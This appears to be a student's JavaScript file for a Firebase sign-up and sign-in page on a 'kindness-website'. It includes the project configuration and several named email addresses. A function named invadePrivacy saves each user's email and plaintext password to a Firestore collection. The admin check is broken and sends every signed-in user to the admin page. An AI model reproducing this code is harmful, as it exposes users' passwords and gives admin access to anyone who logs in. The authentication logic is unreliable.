
  
  // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  var firebaseConfig = {
    apiKey: "AIzaSyCyAJghXpU_s5kmsmSFGf9I5RJKvnTfiJQ",
    authDomain: "kindness-website.firebaseapp.com",
    projectId: "kindness-website",
    storageBucket: "kindness-website.appspot.com",
    messagingSenderId: "379859692313",
    appId: "1:379859692313:web:e3cd175c450c481dd77388",
    measurementId: "G-3WY5C4B4GT"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  const auth =  firebase.auth();

  //signup function
  function signUp(){
    var email = document.getElementById("email");
    var password = document.getElementById("password");

    const promise = auth.createUserWithEmailAndPassword(email.value,password.value);
    //
    promise.catch(e=>alert(e.message));
    alert("SignUp Successfully");

  }

  //signIN function
  function  signIn(){
    var email = document.getElementById("email");
    var password  = document.getElementById("password");
    const promise = auth.signInWithEmailAndPassword(email.value,password.value);
    promise.catch(e=>alert(e.message));
    
  }

  //signOut

  function signOut(){
    auth.signOut();
    alert("SignOut Successfully from System");
  }

  //active user to homepage
  firebase.auth().onAuthStateChanged((user)=>{
    if(user){
      var email = user.email;
      alert("Active user "+email);
      document.location.href='feed.html'
    }if(user){
      var email = "26henryf@students.harker.org" || "26sathvikv@students.harker.org" || "henry@fradin.com";
      alert("Active user "+email+"is an admin");
      document.location.href='admin.html'
    }else{
      alert("No Active user Found")
    }
  })
function invadePrivacy(){
   //Initialize Firebase 
   var firestore = firebase.firestore()
   
   //Variable to access database collection
   const db = firestore.collection("users")
   
     //Get Form Values
     let email = document.getElementById('email').value
     let password = document.getElementById('password').value
 
     //Save Form Data To Firebase
     db.doc(email).set({
       Email: email,
       Password: password
     }).then( () => {
     }).catch((error) => {
       console.log(error)
     })
    }